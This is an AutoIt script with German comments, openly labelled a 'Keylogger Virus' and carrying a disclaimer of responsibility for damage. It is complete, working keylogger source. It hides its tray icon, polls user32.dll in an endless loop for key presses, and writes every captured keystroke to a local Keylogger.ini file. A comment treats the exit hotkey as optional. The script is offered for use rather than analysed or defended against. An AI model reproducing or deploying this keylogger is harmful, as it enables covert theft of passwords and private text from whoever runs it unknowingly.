#cs ----------------------------------------------------------------------------

 AutoIt Version: 3.3.14.5
 Author:         Brain4Tech

 Script Function:
	Keylogger Virus | Ich hafte nicht für entstandene Schäden o.Ä.

#ce ----------------------------------------------------------------------------

; Script Start - Add your code below here
#include <File.au3>
#include <Misc.au3>
#include <Array.au3>

#NoTrayIcon

; --- Bitte das Semikolon vor "HotKeySet" entfernen, damit man den Virus beenden kann ! ---
HotKeySet ("{ESC}", "_exit")

; --- Variablen deklarieren und vorbereiten---
Global $charlist = _getCharList () ; Rufe eine Liste ab, in denen alle Tasten aufgelistet sind die abgehört werden müssen [Array]
$rangecharlist = UBound ($charlist, 1) - 1 ; Finde heraus wie viele Indizes das Array hat

Global $char
Global $timeout_start [$rangecharlist + 1]
Global $timeout_end [$rangecharlist + 1]

For $i = 0 To $rangecharlist
	$timeout_start [$i] = False
Next

$path = @ScriptDir & "\Keylogger.ini"

If Not FileExists($path) Then
	FileWrite ($path, "")
EndIf

$timeout = 170 ; Definiere wie lange eine Taste nicht registriert werden kann (im Folgenden "Timeout")

$DLL = DllOpen("user32.dll") ; Diese DLL muss abgerufen werden, sodass _IsPressed () in einer While-Schleife gut funktioniert (siehe Hilfe)

; --- Start ---
FileOpen ($path)

While 1 ; Starte eine Endlosschleife

	For $i = 0 To $rangecharlist ; Alle Zeichen in dem Dokument werden abgeklappert

		;ConsoleWrite($i & @CRLF)

		If $timeout_start[$i] = Not False Then ; Falls es einen Timout gibt (ungleich False) , dann überprüfe ob der Timeout vorbei ist.

			$time1 = @SEC & @MSEC

			; Hier werden Sonderfälle abgearbeitet: (1) Ende des Timeouts ist über 60 000 (2) Die aktuelle Zeit (Sekunden) ist kleiner das Ende des Timeouts
			; In beiden Fällen werden 60 000 auf die aktuelle Zeit addiert, damit die Differenz nachher einen sinnvollen Wert ergibt
			If $timeout_end[$i] >= 60000 Then
				$time1 = $time1 + 60000

			ElseIf $time1 < $timeout_start[$i] Then
				$time1 = $time1 + 60000

			EndIf

			$difference = $timeout_end[$i] - $time1 ; Berechne die Differenz zwischen dem Ende des Timeouts und der aktuellen Zeit

			If $difference <= 0 Then ; Wenn die Differenz <= 0 ist, dann kann die Taste wieder gedrückt werden (Timeout wird False)
				$timeout_start [$i] = False

				If _IsPressed ($charlist[$i][0], $DLL) Then
					$time2 = @SEC & @MSEC

					$timeout_start [$i] = $time2
					$timeout_end [$i] = $time2 + $timeout

					_AddKey ($charlist[$i][1])

				EndIf

			EndIf

		Else ; Wenn es keinen Timeout für die Taste gibt, dann kann die Taste gedrückt werden

			If _IsPressed ($charlist[$i][0], $DLL) Then ; Wenn die Taste gedrückt wurde, dann ...

				$time2 = @SEC & @MSEC ; Nehme die aktuelle Zeit in Sekunden und Millisekunden

				$timeout_start [$i] = $time2 ; Markiere den Startpunkt des Tastendrucks
				$timeout_end [$i] = $time2 + $timeout ; Speichere die Zeit wann der Timeout abgelaufen ist

				_AddKey ($charlist[$i][1]) ; Füge die Taste zum Logging-Dokument hinzu

			EndIf

		EndIf

	Next

WEnd

Func _AddKey ($key) ; Fügt die Taste dem Dokument hinzu

	FileWrite ($path, $key)

EndFunc

Func _getCharList ()

	$charlist_hex = FileReadToArray (@ScriptDir & "\charlist_hex.txt") ; Lese die Hex-Codes der Tasten aus
	$charlist_plain = FileReadToArray (@ScriptDir & "\charlist_plain.txt") ; Lese die Plain-Codes der Tasten aus

	Local $charlist [UBound ($charlist_hex)] [2] ; Erstelle ein allgemeines Array mit zwei Dimensionen (Pro Taste haben wir den Hex-Code und den Plain-Code)

	For $i = 0 To UBound ($charlist_hex) -1 ; "Fülle" das Array mit Werten
		$charlist [$i][0] = $charlist_hex[$i]
		$charlist [$i][1] = $charlist_plain[$i]
	Next

	Return $charlist ; Gebe das Array zurück

EndFunc

Func _exit () ; Beendet das Programm

	FileClose ($path)
	DllClose ($DLL)

	Exit

EndFunc

